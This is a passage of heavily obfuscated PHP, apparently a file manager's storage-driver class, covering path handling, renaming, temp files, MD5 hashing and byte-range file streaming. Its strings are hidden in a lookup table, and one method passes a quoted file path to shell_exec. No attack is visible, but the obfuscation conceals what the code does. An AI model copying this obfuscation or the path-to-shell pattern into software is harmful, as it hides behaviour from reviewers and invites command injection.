$dÌª¼¨™±Ã) { goto F‚„ßí·Áå; e×ğ—ÃùÃ„: return $fÃ„¶ƒÏ¦Ü; goto b®ÑÛ‰«’; b¿è©¹Ğë: $f±¢Ñğ„ö[$dÌª¼¨™±Ã . $e¿âõÏ½ˆ[66] . $Cİî¢¤¢ÇÍ . $e¿âõÏ½ˆ[67] . $f¸èÀöâ¡Ü] = $f¸èÀöâ¡Ü; $f±¢Ñğ„ö[$dÌª¼¨™±Ã . $e¿âõÏ½ˆ[66] . $Cİî¢¤¢ÇÍ . $e¿âõÏ½ˆ[67] . $fÃ„¶ƒÏ¦Ü] = $f¸èÀöâ¡Ü; $f±¢Ñğ„ö[$Cİî¢¤¢ÇÍ . $e¿âõÏ½ˆ[66] . $dÌª¼¨™±Ã . $e¿âõÏ½ˆ[67] . $fÃ„¶ƒÏ¦Ü] = $fÃ„¶ƒÏ¦Ü; goto e×ğ—ÃùÃ„; F‡ŒÁÓ¶È: $fÃ„¶ƒÏ¦Ü = $fÃ„¶ƒÏ¦Ü ? $fÃ„¶ƒÏ¦Ü : $f¸èÀöâ¡Ü; if (strstr($fÃ„¶ƒÏ¦Ü, $e¿âõÏ½ˆ[69])) { $fÃ„¶ƒÏ¦Ü = str_replace($e¿âõÏ½ˆ[69], $e¿âõÏ½ˆ[70], $fÃ„¶ƒÏ¦Ü); } $f±¢Ñğ„ö[$Cİî¢¤¢ÇÍ . $e¿âõÏ½ˆ[66] . $dÌª¼¨™±Ã . $e¿âõÏ½ˆ[67] . $f¸èÀöâ¡Ü] = $fÃ„¶ƒÏ¦Ü; goto b¿è©¹Ğë; F‚„ßí·Áå: $e¿âõÏ½ˆ =& $_SERVER[Ö]; if (!$f¸èÀöâ¡Ü || !function_exists($e¿âõÏ½ˆ[65])) { return $f¸èÀöâ¡Ü; } static $f±¢Ñğ„ö = array(); goto AÔËÌìÁê; AÔËÌìÁê: $dŒ­—çâÈ = $Cİî¢¤¢ÇÍ . $e¿âõÏ½ˆ[66] . $dÌª¼¨™±Ã . $e¿âõÏ½ˆ[67] . $f¸èÀöâ¡Ü; if (isset($f±¢Ñğ„ö[$dŒ­—çâÈ])) { return $f±¢Ñğ„ö[$dŒ­—çâÈ]; } if (function_exists($e¿âõÏ½ˆ[68])) { $fÃ„¶ƒÏ¦Ü = @mb_convert_encoding($f¸èÀöâ¡Ü, $dÌª¼¨™±Ã, $Cİî¢¤¢ÇÍ); } else { $fÃ„¶ƒÏ¦Ü = @iconv($Cİî¢¤¢ÇÍ, $dÌª¼¨™±Ã, $f¸èÀöâ¡Ü); } goto F‡ŒÁÓ¶È; b®ÑÛ‰«’: } public function getPathInner($Bšè›Ç™Êì) { $d…ä‚“ã = IO::init($Bšè›Ç™Êì); return $d…ä‚“ã->path; } public function getPathOuter($b‘Ë´ÈĞí¿) { $c¢ À•šÇ’ =& $_SERVER[Ö]; $DÉ‹™Ñ¸ = strlen(trim($this->pathBase, $c¢ À•šÇ’[8])); $b‘Ë´ÈĞí¿ = substr(trim($b‘Ë´ÈĞí¿, $c¢ À•šÇ’[8]), $DÉ‹™Ñ¸); return $this->pathDriver . $c¢ À•šÇ’[8] . ltrim($b‘Ë´ÈĞí¿, $c¢ À•šÇ’[8]); } public function isParentOf($fáä‚ˆÆæ, $d‰‡ğóÙØõ) { $A­àÔôĞÅ£ =& $_SERVER[Ö]; $fáä‚ˆÆæ = rtrim(strtolower($fáä‚ˆÆæ), $A­àÔôĞÅ£[8]) . $A­àÔôĞÅ£[8]; $d‰‡ğóÙØõ = rtrim(strtolower($d‰‡ğóÙØõ), $A­àÔôĞÅ£[8]) . $A­àÔôĞÅ£[8]; $DÏ»ˆåá‘ = strpos($d‰‡ğóÙØõ, $fáä‚ˆÆæ) === 0; return $DÏ»ˆåá‘; } public function getType() { $Dôš£ª•Ä =& $_SERVER[Ö]; $A¢«¨»ÁÚ± = str_replace($Dôš£ª•Ä[71], $Dôš£ª•Ä[33], get_class($this)); return strtolower($A¢«¨»ÁÚ±); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($B¾óæ›Ë×·, $B•¿´Å¦§é) { $A¿º¼è¶Šğ =& $_SERVER[Ö]; $dŠ¬°…Ë§® = rtrim($B¾óæ›Ë×·, $A¿º¼è¶Šğ[8]) . $A¿º¼è¶Šğ[8] . $B•¿´Å¦§é; $Fƒ¶”¯‚Â  = $this->exist($dŠ¬°…Ë§®); return $Fƒ¶”¯‚Â  ? $dŠ¬°…Ë§® : !1; } public function renameObject($CğäïÙèŠ‹, $Cƒğ·¢¢ßØ) { goto eë°èÀ†; eë°èÀ†: $cçğ¦­ç¯ =& $_SERVER[Ö]; $f›ìÓ°Àµ = $Cƒğ·¢¢ßØ; Hook::trigger($cçğ¦­ç¯[72], $this, $CğäïÙèŠ‹, $this, $this->pathFather($CğäïÙèŠ‹) . $Cƒğ·¢¢ßØ); goto d›¾ÎÊ³´; d›¾ÎÊ³´: $CğäïÙèŠ‹ = $this->getPathOuter($CğäïÙèŠ‹); $Cƒğ·¢¢ßØ = $this->pathFather($CğäïÙèŠ‹) . $Cƒğ·¢¢ßØ; if (IO::isFile($CğäïÙèŠ‹)) { $cïÈñöß¨º = IO::copy($CğäïÙèŠ‹, $this->pathFather($CğäïÙèŠ‹), REPEAT_RENAME_FOLDER, $f›ìÓ°Àµ); if ($cïÈñöß¨º) { IO::remove($CğäïÙèŠ‹); } } else { $cïÈñöß¨º = IO::mkdir($Cƒğ·¢¢ßØ); if (!$cïÈñöß¨º) { return !1; } $b“«ê÷»ºã = IO::listPath($CğäïÙèŠ‹, !0); $cŠ…Ò÷ÃïË = array_merge($b“«ê÷»ºã[$cçğ¦­ç¯[73]], $b“«ê÷»ºã[$cçğ¦­ç¯[74]]); foreach ($cŠ…Ò÷ÃïË as $A©–„ÓŠÀ‡) { IO::move($A©–„ÓŠÀ‡[$cçğ¦­ç¯[75]], $Cƒğ·¢¢ßØ, REPEAT_RENAME_FOLDER); } IO::remove($CğäïÙèŠ‹); } goto D‡Ö¥– ö…; D‡Ö¥– ö…: return $cïÈñöß¨º ? $Cƒğ·¢¢ßØ : !1; goto Eæ¤„ù¾Š¥; Eæ¤„ù¾Š¥: } public function tempFile($Bàª‰İ¯ª = '', $EÔï÷è‚«é = '') { goto bÈ‹·çõ ‚; dšĞÓƒÔù©: $F¾öŒ»ªš = $EÖš¨¾Â¦ñ . $Bàª‰İ¯ª; @touch($F¾öŒ»ªš); if ($EÔï÷è‚«é) { file_put_contents($F¾öŒ»ªš, $EÔï÷è‚«é); } goto D—¯ñ“Ç«ò; D—¯ñ“Ç«ò: return $F¾öŒ»ªš; goto AŞœº¶¦ã¢; bÈ‹·çõ ‚: if (!$Bàª‰İ¯ª) { $Bàª‰İ¯ª = rand_string(15); } $EÖš¨¾Â¦ñ = TEMP_FILES . rand_string(15) . $_SERVER[Ö][8]; @mkdir($EÖš¨¾Â¦ñ, 511, !0); goto dšĞÓƒÔù©; AŞœº¶¦ã¢: } public function tempFileRemve($eµÍá·ê©ò) { @unlink($eµÍá·ê©ò); @rmdir($this->pathFather($eµÍá·ê©ò)); } public function mkfile($aØèÜÈ•É, $F³áöç…„¯ = '', $Aëããƒ¦Ä† = REPEAT_RENAME) { } public function mkdir($A›ëÀïèàÈ, $aØã°†»¹¸ = REPEAT_SKIP) { } public function copyFile($C¤£ÂÓ¹, $e›Á”‡ÒÊ) { } public function moveFile($eùğŒˆì¬ë, $dÃĞ±³ÕĞÙ) { } public function remove($c‡…¥ê™°Å) { if ($this->isFile($c‡…¥ê™°Å)) { return $this->delFile($c‡…¥ê™°Å); } return $this->delFolder($c‡…¥ê™°Å); } public function rename($c ßÓŞ¼ö, $B‹¼çµ¸¤) { } public function exist($c²‹¡–À½›) { } public function findByHash($eºİ‚°™Â = '', $BªöºÖ‘áğ = '') { return !1; } public function isFile($D„Íˆ…¬îº) { } public function isFolder($AôÖİŠÛ¢) { } public function size($D›ïğÉàäÕ) { } public function info($B¡Â‡†Ëø) { } public function infoSimple($d¤ñÂ›Ò‹) { return $this->info($d¤ñÂ›Ò‹); } public function infoAuth($Fçë‚·¼‘–) { return $this->info($Fçë‚·¼‘–); } public function infoFull($dí”ØÊ¡éô) { return $this->info($dí”ØÊ¡éô); } public function infoWithChildren($cã¶Ø‰ƒİ³) { $cÅÀ ö¸¯‰ =& $_SERVER[Ö]; $dç˜Ô…ï = $this->info($cã¶Ø‰ƒİ³); if ($dç˜Ô…ï && $dç˜Ô…ï[$cÅÀ ö¸¯‰[29]] == $cÅÀ ö¸¯‰[76]) { $A³¸ÚÄÂ = array($cÅÀ ö¸¯‰[77] => 0, $cÅÀ ö¸¯‰[78] => 0, $cÅÀ ö¸¯‰[79] => 0); $this->infoChildren($cã¶Ø‰ƒİ³, $A³¸ÚÄÂ); $dç˜Ô…ï[$cÅÀ ö¸¯‰[77]] = $A³¸ÚÄÂ[$cÅÀ ö¸¯‰[77]]; $dç˜Ô…ï[$cÅÀ ö¸¯‰[80]] = array($cÅÀ ö¸¯‰[81] => $A³¸ÚÄÂ[$cÅÀ ö¸¯‰[78]], $cÅÀ ö¸¯‰[82] => $A³¸ÚÄÂ[$cÅÀ ö¸¯‰[79]]); } return $dç˜Ô…ï; } public function listPath($C¤Ÿƒ”îæ‰, $B˜…Úé´˜ = false) { } public function has($c‹åÑ¨ˆ©Ú, $eóß®ÌŠ£É = false, $d­‡¾º‘Ç = false) { } public function canRead($BøµÖ½£İ) { } public function canWrite($a±Šçì£¹¢) { } public function getContent($C¶´îÂÒË„) { } public function setContent($AÚ‘Ü‘ï®é, $cÔã—¼‘ÍÕ = '') { } protected function infoChildren($e°–Ê¸ì‘Ì, &$cîß§óÙ¼) { $f¸¹¿‘Šë‡ =& $_SERVER[Ö]; check_abort(); $e‹Ë¤‹ïŞã = $this->listPath($e°–Ê¸ì‘Ì, !0); $e‹Ë¤‹ïŞã = array_merge($e‹Ë¤‹ïŞã[$f¸¹¿‘Šë‡[74]], $e‹Ë¤‹ïŞã[$f¸¹¿‘Šë‡[73]]); foreach ($e‹Ë¤‹ïŞã as $e¯÷›èƒÑ) { if ($e¯÷›èƒÑ[$f¸¹¿‘Šë‡[29]] == $f¸¹¿‘Šë‡[76]) { $cîß§óÙ¼[$f¸¹¿‘Šë‡[79]]++; $aºƒËà„±ô = $this->getPathInner($e¯÷›èƒÑ[$f¸¹¿‘Šë‡[75]]); $this->infoChildren($aºƒËà„±ô, $cîß§óÙ¼); } else { $cîß§óÙ¼[$f¸¹¿‘Šë‡[78]]++; $cîß§óÙ¼[$f¸¹¿‘Šë‡[77]] += $e¯÷›èƒÑ[$f¸¹¿‘Šë‡[77]]; } } } public function fileSubstr($eôÇ»òÅëÖ, $fà¥¯öóĞÉ, $eÂŞ¢Ôø°) { } public function listAll($bÙ“Šè“µ) { } public function upload($a‰åØ‚–á×, $DåÌ²Î½å„, $A×«İØ„…¸ = false, $aŞÔ¨ì®² = REPEAT_REPLACE) { } public function uploadFileByID($CĞ¾¬ßñª, $b¿°Â¶ÁÙ‡, $A˜´Ô”Ò½—) { } public function uploadFileByPath($E×ùÉòò‡, $bÕ¬ˆôÛø”, $d–‡å„ƒ¨Ğ = array()) { } public function isUploadServer() { $E¶™°ªÒÍà =& $_SERVER[Ö]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $E¶™°ªÒÍà[83]) { return !0; } return $GLOBALS[$E¶™°ªÒÍà[6]][$E¶™°ªÒÍà[84]][$E¶™°ªÒÍà[85]]; } public function isFileOutServer() { $d•áùÆùóÀ =& $_SERVER[Ö]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $d•áùÆùóÀ[83]) { return !0; } return $GLOBALS[$d•áùÆùóÀ[6]][$d•áùÆùóÀ[84]][$d•áùÆùóÀ[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($aÁ½ÎĞ©Í‚) { $DäÙ«¾·òÈ =& $_SERVER[Ö]; if (!$this->isCdnHost()) { return $aÁ½ÎĞ©Í‚; } return str_replace(trim(get_url_root($aÁ½ÎĞ©Í‚), $DäÙ«¾·òÈ[8]), trim($this->cdnHost, $DäÙ«¾·òÈ[8]), $aÁ½ÎĞ©Í‚); } public function uploadLink($cç‚î‚†§‰, $c†¬›É…¾á = 0) { goto e˜†Æ‚”‘; e˜†Æ‚”‘: $bøÀˆÜ¬Å÷ =& $_SERVER[Ö]; if ($this->isUploadServer()) { return; } $cÚäïàèƒ¿ = $this->getType(); goto DŒò²ÈëƒÖ; e†È°”äÆ˜: $CË––ìçØ“ = $c†¬›É…¾á <= $B—³øÎŒó£ ? $bøÀˆÜ¬Å÷[87] : $bøÀˆÜ¬Å÷[88]; $E–¹‹İ“ø” = (!$c†¬›É…¾á ? 1 : ceil($c†¬›É…¾á / pow(1024, 3))) * 3600 * 4; $D“¯«™¿ã = $this->{$CË––ìçØ“}($cç‚î‚†§‰, $E–¹‹İ“ø”); goto dâ’Ş‹‚×±; DŒò²ÈëƒÖ: if (!in_array($cÚäïàèƒ¿, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $B—³øÎŒó£ = 1024 * 1024 * 10; goto e†È°”äÆ˜; dâ’Ş‹‚×±: if ($D“¯«™¿ã) { $D“¯«™¿ã[$bøÀˆÜ¬Å÷[89]] = $cç‚î‚†§‰; $D“¯«™¿ã[$bøÀˆÜ¬Å÷[90]] = $cÚäïàèƒ¿; } return $D“¯«™¿ã; goto cùŸµ¦Ú½; cùŸµ¦Ú½: } public function uploadFormData($c¤‰ˆŞ¼ª†, $fœ™óŠíîƒ = 3600) { } public function multiUploadFormData($Bê£ñ˜’Ç, $Aº‰ŞŠµŠº = 3600) { } public function download($bÓÅ¬óÄ†Ş, $A‰ˆáæ÷éñ) { } public function ext($e¢‘ƒïª‚£) { $E†º»ˆ³ =& $_SERVER[Ö]; if (strpos($e¢‘ƒïª‚£, $E†º»ˆ³[8]) === -1) { $d³ËØ§è»Ñ = $e¢‘ƒïª‚£; } else { $d³ËØ§è»Ñ = $this->pathThis($e¢‘ƒïª‚£); } $b²­¹øßƒ = $E†º»ˆ³[33]; if (strstr($d³ËØ§è»Ñ, $E†º»ˆ³[91])) { $b²­¹øßƒ = substr($d³ËØ§è»Ñ, strrpos($d³ËØ§è»Ñ, $E†º»ˆ³[91]) + 1); $b²­¹øßƒ = strtolower($b²­¹øßƒ); } if (strlen($b²­¹øßƒ) > 3 && preg_match($E†º»ˆ³[92], $b²­¹øßƒ, $CâÕÆÌ•÷‹)) { $b²­¹øßƒ = $E†º»ˆ³[33]; } return $b²­¹øßƒ; } public function pathThis($aŞ•°ÔÆ¡Ş) { $d®á„Ë’— =& $_SERVER[Ö]; $aŞ•°ÔÆ¡Ş = str_replace($d®á„Ë’—[93], $d®á„Ë’—[8], rtrim($aŞ•°ÔÆ¡Ş, $d®á„Ë’—[8])); $CÙ½öÃé„ = strrpos($aŞ•°ÔÆ¡Ş, $d®á„Ë’—[8]); if ($CÙ½öÃé„ === !1) { return $aŞ•°ÔÆ¡Ş; } return substr($aŞ•°ÔÆ¡Ş, $CÙ½öÃé„ + 1); } public function pathFather($F´‘ô‰•æ) { $FğŠÀÅ =& $_SERVER[Ö]; $F´‘ô‰•æ = str_replace($FğŠÀÅ[93], $FğŠÀÅ[8], rtrim($F´‘ô‰•æ, $FğŠÀÅ[8])); $aæÈæŞ„ĞĞ = strrpos($F´‘ô‰•æ, $FğŠÀÅ[8]); if ($aæÈæŞ„ĞĞ === !1) { return $FğŠÀÅ[33]; } return substr($F´‘ô‰•æ, 0, $aæÈæŞ„ĞĞ + 1); } public function hashSimple($cÌ²á‡¦ ÷) { goto A‘ô¤ôˆòÚ; BÖ›ª¥Æ„ì: $AÎƒ†ê±Ç = 200; $e³ÃŠïÄàå = 50; if ($aâÀò©œ¬º <= $AÎƒ†ê±Ç * $e³ÃŠïÄàå) { return $this->hashMd5($cÌ²á‡¦ ÷) . $aâÀò©œ¬º; } goto cƒ°Ã‡×à¯; A’¸âŒ®›: $Dæ¹ÚÙ Ÿˆ .= $this->fileSubstr($cÌ²á‡¦ ÷, $aâÀò©œ¬º - $AÎƒ†ê±Ç, $AÎƒ†ê±Ç); return md5($Dæ¹ÚÙ Ÿˆ) . $aâÀò©œ¬º; goto AùïÜƒ§–¾; cƒ°Ã‡×à¯: $Eì¨œ‡Äâ = intval($aâÀò©œ¬º / $e³ÃŠïÄàå); $Dæ¹ÚÙ Ÿˆ = $f†·’²ô’’[33]; for ($B®ÒÃ®Œâ© = 0; $B®ÒÃ®Œâ© < $e³ÃŠïÄàå; $B®ÒÃ®Œâ©++) { $Dæ¹ÚÙ Ÿˆ .= $this->fileSubstr($cÌ²á‡¦ ÷, $Eì¨œ‡Äâ * $B®ÒÃ®Œâ©, $AÎƒ†ê±Ç); } goto A’¸âŒ®›; A‘ô¤ôˆòÚ: $f†·’²ô’’ =& $_SERVER[Ö]; if (!$cÌ²á‡¦ ÷) { return md5($f†·’²ô’’[33]); } $aâÀò©œ¬º = $this->size($cÌ²á‡¦ ÷); goto BÖ›ª¥Æ„ì; AùïÜƒ§–¾: } public static $md5Cache = array(); public function hashMd5($d³ƒˆæ¨‰ì) { $d³ƒˆæ¨‰ì = $this->iconvSystem($d³ƒˆæ¨‰ì); if (isset(self::$md5Cache[$d³ƒˆæ¨‰ì])) { return self::$md5Cache[$d³ƒˆæ¨‰ì]; } self::$md5Cache[$d³ƒˆæ¨‰ì] = $this->hashMd5Shell($d³ƒˆæ¨‰ì); if (!self::$md5Cache[$d³ƒˆæ¨‰ì]) { self::$md5Cache[$d³ƒˆæ¨‰ì] = @md5_file($d³ƒˆæ¨‰ì); } return self::$md5Cache[$d³ƒˆæ¨‰ì]; } private function hashMd5Shell($fôµ“¿™Êƒ) { goto A›×†ƒ‘°; Fóïê…Õ¾: $BŒ¿’´âŒî = Cache::get($BÏ¸—¹ÈÚĞ[97]); if (!$BŒ¿’´âŒî) { $c¼š„Ó ¤„ = BASIC_PATH . $BÏ¸—¹ÈÚĞ[98]; $Fñöéğˆ‰ = md5_file($c¼š„Ó ¤„); $BŒ¿’´âŒî = $BÏ¸—¹ÈÚĞ[99]; foreach ($Bç“é‘ò¶¼ as $f¨‚’˜ñ¥š) { $eŞÄŠÔ—Ğ = shell_exec($f¨‚’˜ñ¥š . "\x20\x22{$c¼š„Ó ¤„}\x22"); if ($eŞÄŠÔ—Ğ && substr(trim($eŞÄŠÔ—Ğ), 0, 32) == $Fñöéğˆ‰) { $BŒ¿’´âŒî = $f¨‚’˜ñ¥š; break; } } Cache::set($BÏ¸—¹ÈÚĞ[97], $BŒ¿’´âŒî, 3600); } if ($BŒ¿’´âŒî == $BÏ¸—¹ÈÚĞ[99]) { return !1; } goto AÇÜèŠç³×; AÇÜèŠç³×: $eŞÄŠÔ—Ğ = shell_exec($BŒ¿’´âŒî . "\x20\42{$fôµ“¿™Êƒ}\x22"); return substr($eŞÄŠÔ—Ğ, 0, 32); goto e±×¯Ï§òñ; A›×†ƒ‘°: $BÏ¸—¹ÈÚĞ =& $_SERVER[Ö]; if (!function_exists($BÏ¸—¹ÈÚĞ[94])) { return !1; } $Bç“é‘ò¶¼ = array($BÏ¸—¹ÈÚĞ[95], $BÏ¸—¹ÈÚĞ[96]); goto Fóïê…Õ¾; e±×¯Ï§òñ: } public function link($c¬¢“§ÒÅ) { return $c¬¢“§ÒÅ; } public function fileOut($C³Û¤‰‹™¯, $b‡´¸µàÈß = false, $EÜ†ˆ­Î™ = false, $a£ù‘­›Ù¸ = '') { goto eØ¸ˆ·‰Š¥; Fèç¼èÜí…: header($Bµ¦†˜Éµ[124]); header($Bµ¦†˜Éµ[125]); header($Bµ¦†˜Éµ[126]); goto d Œ°›ë¹‚; DÂŸç”¡ç°: $BàŞã´¤Í³ = rawurlencode($Cƒƒ¤‡…Ùˆ); $BàŞã´¤Í³ = $Bµ¦†˜Éµ[112] . $BàŞã´¤Í³ . $Bµ¦†˜Éµ[116] . $BàŞã´¤Í³; if ($b‡´¸µàÈß) { header($Bµ¦†˜Éµ[117]); header($Bµ¦†˜Éµ[118] . $BàŞã´¤Í³); } else { header($Bµ¦†˜Éµ[119] . $BàŞã´¤Í³); } goto C¾™»¨»Ì…; féºİˆÚñµ: $C¥õ•²é = $this->getType() == $Bµ¦†˜Éµ[101]; $a”‡„«¹Ëà = $GLOBALS[$Bµ¦†˜Éµ[6]][$Bµ¦†˜Éµ[84]][$Bµ¦†˜Éµ[102]][$Bµ¦†˜Éµ[103]]; $Cˆ‰øğ‰…¸ = (double) $GLOBALS[$Bµ¦†˜Éµ[6]][$Bµ¦†˜Éµ[84]][$Bµ¦†˜Éµ[102]][$Bµ¦†˜Éµ[104]] * 1024 * 1024; goto bö„Š×Ãç¢; Cå¼ÅâÇÒ¶: $aŒ­¶·“ÈÔ = get_file_mime($C–ÀÛÏÂ„á); if (strstr($aŒ­¶·“ÈÔ, $Bµ¦†˜Éµ[113])) { $aŒ­¶·“ÈÔ = $aŒ­¶·“ÈÔ . $Bµ¦†˜Éµ[114]; } if ($b‡´¸µàÈß === !1 && !mime_support($aŒ­¶·“ÈÔ)) { $b‡´¸µàÈß = !0; $aŒ­¶·“ÈÔ = $Bµ¦†˜Éµ[115]; } goto DÂŸç”¡ç°; f¹è£ÈÄÅ: $d¤Â‘ê³È‹ = strtolower($_SERVER[$Bµ¦†˜Éµ[137]]); if ($C¥õ•²é && $d¤Â‘ê³È‹ && $a”‡„«¹Ëà) { if (strstr($d¤Â‘ê³È‹, $Bµ¦†˜Éµ[138])) { header($Bµ¦†˜Éµ[139] . $C³Û¤‰‹™¯); } else { if (strstr($d¤Â‘ê³È‹, $Bµ¦†˜Éµ[140])) { header($Bµ¦†˜Éµ[141] . $C³Û¤‰‹™¯); } else { if (strstr($d¤Â‘ê³È‹, $Bµ¦†˜Éµ[142])) { header($Bµ¦†˜Éµ[143] . $C³Û¤‰‹™¯); } } } if ($Cˆ‰øğ‰…¸) { header($Bµ¦†˜Éµ[144] . $Cˆ‰øğ‰…¸); } return; } if (isset($_SERVER[$Bµ¦†˜Éµ[145]])) { if (preg_match($Bµ¦†˜Éµ[146], $_SERVER[$Bµ¦†˜Éµ[145]], $FË¡Ø™ÄŒŠ)) { $c–ƒ¨Ü…à° = intval($FË¡Ø™ÄŒŠ[1]); if (!empty($FË¡Ø™ÄŒŠ[2])) { $B‡Ì ÕïŒ = intval($FË¡Ø™ÄŒŠ[2]); } } header($Bµ¦†˜Éµ[147]); header("\x43\157\x6e\164\x65\x6e\x74\x2d\x52\141\x6e\147\145\72\40\x62\x79\x74\145\x73\x20{$c–ƒ¨Ü…à°}\55{$B‡Ì ÕïŒ}\x2f" . $dÀÁÑØÌ‹); } else { header($Bµ¦†˜Éµ[148]); } goto déŸ¥ì; a»ÀšõÖøã: if (in_array($C–ÀÛÏÂ„á, array($Bµ¦†˜Éµ[107], $Bµ¦†˜Éµ[108], $Bµ¦†˜Éµ[109], $Bµ¦†˜Éµ[110]))) { $C–ÀÛÏÂ„á = $Bµ¦†˜Éµ[111]; } if (!$a£ù‘­›Ù¸) { $a£ù‘­›Ù¸ = md5($a†Ò¢º’Èå . $this->hashSimple($C³Û¤‰‹™¯)); } $a£ù‘­›Ù¸ = $Bµ¦†˜Éµ[112] . $a£ù‘­›Ù¸ . $Bµ¦†˜Éµ[112]; goto Cå¼ÅâÇÒ¶; cíï±ù˜¬: header($Bµ¦†˜Éµ[134] . $dÀÁÑØÌ‹); header($Bµ¦†˜Éµ[135]); if (!$b‡´¸µàÈß && $C–ÀÛÏÂ„á == $Bµ¦†˜Éµ[136]) { if ($dÀÁÑØÌ‹ > 1024 * 1024 * 5) { die; } $BßØÂÜïŞä = $this->getContent($C³Û¤‰‹™¯); $BßØÂÜïŞä = Html::clearSVG($BßØÂÜïŞä); echo $BßØÂÜïŞä; die; } goto f¹è£ÈÄÅ; aíï”ªŸ†Æ: $dÀÁÑØÌ‹ = $DÎ‰ÑÚ ´Æ[$Bµ¦†˜Éµ[77]]; $a†Ò¢º’Èå = gmdate($Bµ¦†˜Éµ[105], $DÎ‰ÑÚ ´Æ[$Bµ¦†˜Éµ[106]]); $Cƒƒ¤‡…Ùˆ = $EÜ†ˆ­Î™ ? $EÜ†ˆ­Î™ : $this->iconvApp($DÎ‰ÑÚ ´Æ[$Bµ¦†˜Éµ[28]]); goto FÙ¬Ô†÷¿ò; bö„Š×Ãç¢: @ob_end_clean(); set_timeout(); $DÎ‰ÑÚ ´Æ = $this->infoFull($C³Û¤‰‹™¯); goto aíï”ªŸ†Æ; FÙ¬Ô†÷¿ò: $c–ƒ¨Ü…à° = 0; $B‡Ì ÕïŒ = $dÀÁÑØÌ‹ - 1; $C–ÀÛÏÂ„á = $this->ext($Cƒƒ¤‡…Ùˆ); goto a»ÀšõÖøã; déŸ¥ì: header($Bµ¦†˜Éµ[149] . ($B‡Ì ÕïŒ - $c–ƒ¨Ü…à° + 1)); if ($_SERVER[$Bµ¦†˜Éµ[150]] == $Bµ¦†˜Éµ[151]) { return; } $a¸´¬”À‰ = 1024 * 100; goto aÅ‘â¶ÚìÇ; eØ¸ˆ·‰Š¥: $Bµ¦†˜Éµ =& $_SERVER[Ö]; $this->cacheMethod(null, null); if (!$C³Û¤‰‹™¯ || !$this->exist($C³Û¤‰‹™¯)) { show_json(LNG($Bµ¦†˜Éµ[100]), !1, $EÜ†ˆ­Î™); } goto féºİˆÚñµ; aÅ‘â¶ÚìÇ: $Aå–ô¬âå = 0; if ($Cˆ‰øğ‰…¸) { $Aå–ô¬âå = intval(1000 * 1000 * ($a¸´¬”À‰ / $Cˆ‰øğ‰…¸)); } while ($c–ƒ¨Ü…à° <= $B‡Ì ÕïŒ) { $e‡Â¿è¦º = timeFloat(); check_abort(); $c›ºŠ©ìÕÀ = $B‡Ì ÕïŒ - $c–ƒ¨Ü…à° + 1; if ($c›ºŠ©ìÕÀ <= $a¸´¬”À‰) { $a¸´¬”À‰ = $c›ºŠ©ìÕÀ; } echo $this->fileSubstr($C³Û¤‰‹™¯, $c–ƒ¨Ü…à°, $a¸´¬”À‰); $c–ƒ¨Ü…à° += $a¸´¬”À‰; if ($a¸´¬”À‰ == $c›ºŠ©ìÕÀ) { $c–ƒ¨Ü…à° = $B‡Ì ÕïŒ + 1; } if ($Aå–ô¬âå) { $EÓª¼®³ŒÏ = intval(1000 * 1000 * (timeFloat() - $e‡Â¿è¦º)); $a£ß˜çšÒİ = $Aå–ô¬âå - $EÓª¼®³ŒÏ; if ($a£ß˜çšÒİ > 5) { usleep($a£ß˜çšÒİ); } } } goto d¶–‘¦ÂÉÎ; aö‘Ú÷İíñ: header($Bµ¦†˜Éµ[131] . $a†Ò¢º’Èå . $Bµ¦†˜Éµ[123]); header($Bµ¦†˜Éµ[132] . $Cƒƒ¤‡…Ùˆ); header($Bµ¦†˜Éµ[133]); goto cíï±ù˜¬; C¾™»¨»Ì…: header($Bµ¦†˜Éµ[120]); header($Bµ¦†˜Éµ[121] . $aŒ­¶·“ÈÔ); header($Bµ¦†˜Éµ[122] . gmdate($Bµ¦†˜Éµ[105], time() + 3600 * 24 * 30) . $Bµ¦†˜Éµ[123]); goto Fèç¼èÜí…; d Œ°›ë¹‚: if (isset($_SERVER[$Bµ¦†˜Éµ[127]]) && strtotime($_SERVER[$Bµ¦†˜Éµ[127]]) == $DÎ‰ÑÚ ´Æ[$Bµ¦†˜Éµ[106]]) { header($Bµ¦†˜Éµ[128], !0, 304); die; } if (isset($_SERVER[$Bµ¦†˜Éµ[129]]) && $_SERVER[$Bµ¦†˜Éµ[129]] == $a£ù‘­›Ù¸) { header($Bµ¦†˜Éµ[130] . $a£ù‘­›Ù¸, !0, 304); die; } header($Bµ¦†˜Éµ[130] . $a£ù‘­›Ù¸); goto aö‘Ú÷İíñ; d¶–‘¦ÂÉÎ: } public function fileOutServer($A¯§ÒÜ¡ãˆ, $f„Áé¢ØÆ = false, $d¥”¿æµòë = false, $D¿ŠÁÜ‹â = '') { $this->fileOut($A¯§ÒÜ¡ãˆ, $f„Áé¢ØÆ, $d¥”¿æµòë, $D¿ŠÁÜ‹â); } public function fileOutLink($d­±œ«˜†) { header($_SERVER[Ö][152] . $d­±œ«˜†); die; } public function cacheMethod($eÅºå¸ÜìÕ, $C»ÂöœÂ¶) { goto bØó“×íÃ; d¨©äíò„š: if (!is_null($B‡¸ŸÎÊ¹)) { return $B‡¸ŸÎÊ¹; } $B‡¸ŸÎÊ¹ = $this->{$eÅºå¸ÜìÕ}($C»ÂöœÂ¶); $eªŒÒ²„›±[$E£îÁé×Ï¿] = $B‡¸ŸÎÊ¹; goto d·ŸÎ—ÊÀ; d·ŸÎ—ÊÀ: return $B‡¸ŸÎÊ¹; goto eğá¸…°…Ê; bØó“×íÃ: $Câ´®ÌÆõ¿ =& $_SERVER[Ö]; static $eªŒÒ²„›± = array(); $E£îÁé×Ï¿ = $Câ´®ÌÆõ¿[153] . $eÅºå¸ÜìÕ . $Câ´®ÌÆõ¿[154] . rtrim($C»ÂöœÂ¶, $Câ´®ÌÆõ¿[8]); goto A¦•İÎ¨·; A¦•İÎ¨·: if (is_null($eÅºå¸ÜìÕ)) { $eªŒÒ²„›± = array(); return; } if (is_null($C»ÂöœÂ¶)) { unset($eªŒÒ²„›±[$E£îÁé×Ï¿]); return; } $B‡¸ŸÎÊ¹ = isset($eªŒÒ²„›±[$E£îÁé×Ï¿]) ? $eªŒÒ²„›±[$E£îÁé×Ï¿] : null; goto d¨©äíò„š; eğá¸…°…Ê: } public function fileOutImage($e¸µ´õˆí, 